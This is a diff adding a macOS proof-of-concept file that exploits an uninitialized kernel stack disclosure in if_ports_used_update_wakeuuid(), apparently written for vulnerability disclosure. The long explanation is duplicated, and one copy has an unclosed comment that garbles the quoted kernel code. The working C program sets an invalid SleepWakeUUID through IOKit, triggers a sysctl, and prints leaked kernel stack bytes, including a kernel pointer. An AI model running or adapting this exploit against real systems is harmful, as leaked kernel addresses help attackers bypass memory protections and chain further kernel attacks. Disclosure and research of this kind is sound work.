@@ -1,0 +1,318 @@
+/*
+macOS 10.13.4 introduced the file bsd/net/if_ports_used.c, which defines sysctls for inspecting
+ports, and added the function IOPMCopySleepWakeUUIDKey() to the file
+iokit/Kernel/IOPMrootDomain.cpp. Here's the code of the latter function:
+
+	extern "C" bool
+	IOPMCopySleepWakeUUIDKey(char *buffer, size_t buf_len)
+	{
+		if (!gSleepWakeUUIDIsSet) {
+			return (false);
+		}
+	
+		if (buffer != NULL) {
+			OSString *string;
+	
+			string = (OSString *)
+			    gRootDomain->copyProperty(kIOPMSleepWakeUUIDKey);
+	
+			if (string == NULL) {
+				*buffer = '\0';
+			} else {
+				strlcpy(buffer, string->getCStringNoCopy(), buf_len);
+	
+				string->release();
+			}
+		}
+	
+		return (true);
+	}
+
+This function is interesting because it copies a caller-specified amount of data from the
+"SleepWakeUUID" property (which is user-controllable). Thus, if a user process sets "SleepWakeUUID"
+to a shorter string than the caller expects and then triggers IOPMCopySleepWakeUUIDKey(),
+out-of-bounds heap data will be copied into the caller's buffer.
+
+However, triggering this particular information leak is challenging, since the only caller is the
+function if_ports_used_update_wakeuuid(). Nonetheless, this function also contains an information
+leak:
+
+	void
+	if_ports_used_update_wakeuuid(struct ifnet *ifp)
+	{
+		uuid_t wakeuuid;							// (a) wakeuuid is uninitialized.
+		bool wakeuuid_is_set = false;
+		bool updated = false;
+	
+		if (__improbable(use_test_wakeuuid)) {
+			wakeuuid_is_set = get_test_wake_uuid(wakeuuid);
+		} else {
+			uuid_string_t wakeuuid_str;
+	
+			wakeuuid_is_set = IOPMCopySleepWakeUUIDKey(wakeuuid_str,	// (b) wakeuuid_str is controllable.
+			    sizeof(wakeuuid_str));
+			if (wakeuuid_is_set) {
+				uuid_parse(wakeuuid_str, wakeuuid);			// (c) The return value of
+			}								//     uuid_parse() is not checked.
+		}
+	
+		if (!wakeuuid_is_set) {
+			if (if_ports_used_verbose > 0) {
+				os_log_info(OS_LOG_DEFAULT,
+				    "%s: SleepWakeUUID not set, "
+				    "don't update the port list for %s\n",
+				    __func__, ifp != NULL ? if_name(ifp) : "");
+			}
+			wakeuuid_not_set_count += 1;
+			if (ifp != NULL) {
+				microtime(&wakeuuid_not_set_last_time);
+				strlcpy(wakeuuid_not_set_last_if, if_name(ifp),
+				    sizeof(wakeuuid_not_set_last_if));
+			}	
+			return;
+		}
+	
+		lck_mtx_lock(&net_port_entry_head_lock);
+		if (uuid_compare(wakeuuid, current_wakeuuid) != 0) {			// (e) These UUIDs will be different.
+			net_port_entry_list_clear();
+			uuid_copy(current_wakeuuid, wakeuuid);				// (f) Uninitialized stack garbage
+			updated = true;							//     will be copied into a sysctl
+		}									//     variable.
+		/* 
+		 * Record the time last checked
+		 
+		microuptime(&wakeuiid_last_check);
+		lck_mtx_unlock(&net_port_entry_head_lock);
+	
+		if (updated && if_ports_used_verbose > 0) {
+			uuid_string_t uuid_str;
+	
+			uuid_unparse(current_wakeuuid, uuid_str);
+			log(LOG_ERR, "%s: current wakeuuid %s\n",
+			    __func__,
+			    uuid_str);
+		}
+	}
+
+After the user-controllable "SleepWakeUUID" property is copied into the wakeuuid_str buffer using
+IOPMCopySleepWakeUUIDKey(), the UUID string is converted into a (binary) UUID using the function
+uuid_parse(). uuid_parse() is meant to parse the string-encoded UUID into the local wakeuuid
+buffer. However, the wakeuuid buffer is not initialized and the return value of uuid_parse() is not
+checked, meaning that if we set the "SleepWakeUUID" property's first character to anything other
+than a valid hexadecimal digit, we can get random stack garbage copied into the global
+current_wakeuuid buffer. This is problematic because current_wakeuuid is a sysctl variable, meaning
+its value can be read from userspace.
+
+Tested on macOS 10.13.6 17G2112:
+
+	bazad@bazad-macbookpro ~/Developer/poc/wakeuuid-leak % clang wakeuuid-leak.c -framework IOKit -framework CoreFoundation -o wakeuuid-leak
+	bazad@bazad-macbookpro ~/Developer/poc/wakeuuid-leak % ./wakeuuid-leak
+	1. Sleep the device.
+	2. Wake the device.
+	3. Press any key to continue.
+	
+	current_wakeuuid: 0xd0ddc6477f1e00b7 0xffffff801e468a28
+*/
+
+/*
+ * wakeuuid-leak.c
+ * Brandon Azad (bazad@google.com)
+ */
+
+#if 0
+iOS/macOS: 16-byte uninitialized kernel stack disclosure in if_ports_used_update_wakeuuid().
+
+macOS 10.13.4 introduced the file bsd/net/if_ports_used.c, which defines sysctls for inspecting
+ports, and added the function IOPMCopySleepWakeUUIDKey() to the file
+iokit/Kernel/IOPMrootDomain.cpp. Here's the code of the latter function:
+
+	extern "C" bool
+	IOPMCopySleepWakeUUIDKey(char *buffer, size_t buf_len)
+	{
+		if (!gSleepWakeUUIDIsSet) {
+			return (false);
+		}
+	
+		if (buffer != NULL) {
+			OSString *string;
+	
+			string = (OSString *)
+			    gRootDomain->copyProperty(kIOPMSleepWakeUUIDKey);
+	
+			if (string == NULL) {
+				*buffer = '\0';
+			} else {
+				strlcpy(buffer, string->getCStringNoCopy(), buf_len);
+	
+				string->release();
+			}
+		}
+	
+		return (true);
+	}
+
+This function is interesting because it copies a caller-specified amount of data from the
+"SleepWakeUUID" property (which is user-controllable). Thus, if a user process sets "SleepWakeUUID"
+to a shorter string than the caller expects and then triggers IOPMCopySleepWakeUUIDKey(),
+out-of-bounds heap data will be copied into the caller's buffer.
+
+However, triggering this particular information leak is challenging, since the only caller is the
+function if_ports_used_update_wakeuuid(). Nonetheless, this function also contains an information
+leak:
+
+	void
+	if_ports_used_update_wakeuuid(struct ifnet *ifp)
+	{
+		uuid_t wakeuuid;							// (a) wakeuuid is uninitialized.
+		bool wakeuuid_is_set = false;
+		bool updated = false;
+	
+		if (__improbable(use_test_wakeuuid)) {
+			wakeuuid_is_set = get_test_wake_uuid(wakeuuid);
+		} else {
+			uuid_string_t wakeuuid_str;
+	
+			wakeuuid_is_set = IOPMCopySleepWakeUUIDKey(wakeuuid_str,	// (b) wakeuuid_str is controllable.
+			    sizeof(wakeuuid_str));
+			if (wakeuuid_is_set) {
+				uuid_parse(wakeuuid_str, wakeuuid);			// (c) The return value of
+			}								//     uuid_parse() is not checked.
+		}
+	
+		if (!wakeuuid_is_set) {
+			if (if_ports_used_verbose > 0) {
+				os_log_info(OS_LOG_DEFAULT,
+				    "%s: SleepWakeUUID not set, "
+				    "don't update the port list for %s\n",
+				    __func__, ifp != NULL ? if_name(ifp) : "");
+			}
+			wakeuuid_not_set_count += 1;
+			if (ifp != NULL) {
+				microtime(&wakeuuid_not_set_last_time);
+				strlcpy(wakeuuid_not_set_last_if, if_name(ifp),
+				    sizeof(wakeuuid_not_set_last_if));
+			}	
+			return;
+		}
+	
+		lck_mtx_lock(&net_port_entry_head_lock);
+		if (uuid_compare(wakeuuid, current_wakeuuid) != 0) {			// (e) These UUIDs will be different.
+			net_port_entry_list_clear();
+			uuid_copy(current_wakeuuid, wakeuuid);				// (f) Uninitialized stack garbage
+			updated = true;							//     will be copied into a sysctl
+		}									//     variable.
+		/* 
+		 * Record the time last checked
+		 */
+		microuptime(&wakeuiid_last_check);
+		lck_mtx_unlock(&net_port_entry_head_lock);
+	
+		if (updated && if_ports_used_verbose > 0) {
+			uuid_string_t uuid_str;
+	
+			uuid_unparse(current_wakeuuid, uuid_str);
+			log(LOG_ERR, "%s: current wakeuuid %s\n",
+			    __func__,
+			    uuid_str);
+		}
+	}
+
+After the user-controllable "SleepWakeUUID" property is copied into the wakeuuid_str buffer using
+IOPMCopySleepWakeUUIDKey(), the UUID string is converted into a (binary) UUID using the function
+uuid_parse(). uuid_parse() is meant to parse the string-encoded UUID into the local wakeuuid
+buffer. However, the wakeuuid buffer is not initialized and the return value of uuid_parse() is not
+checked, meaning that if we set the "SleepWakeUUID" property's first character to anything other
+than a valid hexadecimal digit, we can get random stack garbage copied into the global
+current_wakeuuid buffer. This is problematic because current_wakeuuid is a sysctl variable, meaning
+its value can be read from userspace.
+
+Tested on macOS 10.13.6 17G2112:
+
+	bazad@bazad-macbookpro ~/Developer/poc/wakeuuid-leak % clang wakeuuid-leak.c -framework IOKit -framework CoreFoundation -o wakeuuid-leak
+	bazad@bazad-macbookpro ~/Developer/poc/wakeuuid-leak % ./wakeuuid-leak
+	1. Sleep the device.
+	2. Wake the device.
+	3. Press any key to continue.
+	
+	current_wakeuuid: 0xd0ddc6477f1e00b7 0xffffff801e468a28
+#endif
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+#include <IOKit/IOKitLib.h>
+#include <sys/sysctl.h>
+
+int
+main(int argc, const char *argv[]) {
+	CFStringRef kIOPMSleepWakeUUIDKey = CFSTR("SleepWakeUUID");
+	// First get IOPMrootDomain::setProperties() called with "SleepWakeUUID" set to an invalid
+	// value.
+	io_service_t IOPMrootDomain = IOServiceGetMatchingService(
+			kIOMasterPortDefault,
+			IOServiceMatching("IOPMrootDomain"));
+	if (IOPMrootDomain == IO_OBJECT_NULL) {
+		printf("Error: Could not look up IOPMrootDomain\n");
+		return 1;
+	}
+	kern_return_t kr = IORegistryEntrySetCFProperty(
+			IOPMrootDomain,
+			kIOPMSleepWakeUUIDKey,
+			CFSTR(""));
+	if (kr != KERN_SUCCESS) {
+		printf("Error: Could not set SleepWakeUUID\n");
+		return 2;
+	}
+	// Next get IOPMrootDomain::handlePublishSleepWakeUUID() called, probably via
+	// IOPMrootDomain::handleOurPowerChangeStart(). For now, just ask the tester to sleep and
+	// wake the device.
+	printf("1. Sleep the device.\n2. Wake the device.\n3. Press any key to continue.\n");
+	getchar();
+	// Check that we successfully set an invalid UUID.
+	CFTypeRef value = IORegistryEntryCreateCFProperty(
+			IOPMrootDomain,
+			kIOPMSleepWakeUUIDKey,
+			kCFAllocatorDefault,
+			0);
+	if (!CFEqual(value, CFSTR(""))) {
+		printf("Error: SleepWakeUUID not set successfully\n");
+		return 3;
+	}
+	// Now we need to trigger the leak in if_ports_used_update_wakeuuid(). We can use the
+	// sysctl net.link.generic.system.get_ports_used.<ifindex>.<protocol>.<flags>.
+	size_t get_ports_used_mib_size = 5;
+	int get_ports_used_mib[get_ports_used_mib_size + 3];
+	int err = sysctlnametomib("net.link.generic.system.get_ports_used",
+			get_ports_used_mib, &get_ports_used_mib_size);
+	if (err != 0) {
+		return 4;
+	}
+	get_ports_used_mib[get_ports_used_mib_size++] = 1;	// ifindex
+	get_ports_used_mib[get_ports_used_mib_size++] = 0;	// protocol
+	get_ports_used_mib[get_ports_used_mib_size++] = 0;	// flags
+	uint8_t ports_used[65536 / 8];
+	size_t ports_used_size = sizeof(ports_used);
+	err = sysctl(get_ports_used_mib, get_ports_used_mib_size,
+			ports_used, &ports_used_size, NULL, 0);
+	if (err != 0) {
+		printf("Error: sysctl %s: errno %d\n",
+				"net.link.generic.system.get_ports_used", errno);
+		return 5;
+	}
+	// Finally retrieve the leak with sysctl
+	// net.link.generic.system.port_used.current_wakeuuid.
+	uint8_t current_wakeuuid[16];
+	size_t current_wakeuuid_size = sizeof(current_wakeuuid);
+	err = sysctlbyname("net.link.generic.system.port_used.current_wakeuuid",
+			current_wakeuuid, &current_wakeuuid_size, NULL, 0);
+	if (err != 0) {
+		printf("Error: sysctl %s: errno %d\n",
+				"net.link.generic.system.port_used.current_wakeuuid", errno);
+		return 6;
+	}
+	uint64_t *leak = (uint64_t *)current_wakeuuid;
+	printf("current_wakeuuid: 0x%016llx 0x%016llx\n", leak[0], leak[1]);
+	return 0;
+}
